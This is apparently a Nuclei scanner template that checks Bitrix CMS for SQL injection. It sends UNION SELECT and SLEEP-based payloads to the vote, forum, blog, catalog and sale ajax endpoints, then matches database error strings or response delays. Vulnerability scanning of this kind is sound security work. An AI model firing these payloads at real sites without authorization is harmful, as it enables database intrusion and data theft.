id: bitrix-sql-injection

info:
  name: Bitrix SQL Injection Vulnerabilities
  author: clevergod
  severity: high
  description: |
    Проверка различных SQL-инъекций в Bitrix CMS через популярные эндпоинты
  tags: bitrix,sqli,sql-injection,database

requests:
  # SQL Injection в компоненте vote
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/vote.result.new/ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      VOTE_ID=1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100-- -
    matchers:
      - type: word
        name: sqli-vote
        words:
          - "mysql_fetch_array"
          - "ORA-"
          - "SQL syntax"
          - "mysql_num_rows"

  # SQL Injection в компоненте forum
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/forum.topic.list/ajax.php?FID=1' AND SLEEP(5)-- -"
    matchers:
      - type: dsl
        name: sqli-forum-time
        dsl:
          - 'duration>=5'

  # SQL Injection в компоненте blog
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/blog.post.list/ajax.php?BLOG_ID=1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100-- -"
    matchers:
      - type: word
        name: sqli-blog
        words:
          - "mysql_fetch_array"
          - "ORA-"
          - "SQL syntax"

  # SQL Injection в компоненте catalog
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/catalog.section.list/ajax.php?IBLOCK_ID=1' AND SLEEP(3)-- -"
    matchers:
      - type: dsl
        name: sqli-catalog-time
        dsl:
          - 'duration>=3'

  # SQL Injection в компоненте sale
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/sale.basket.basket/ajax.php?PRODUCT_ID=1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100-- -"
    matchers:
      - type: word
        name: sqli-sale
        words:
          - "mysql_fetch_array"
          - "ORA-"
          - "SQL syntax" 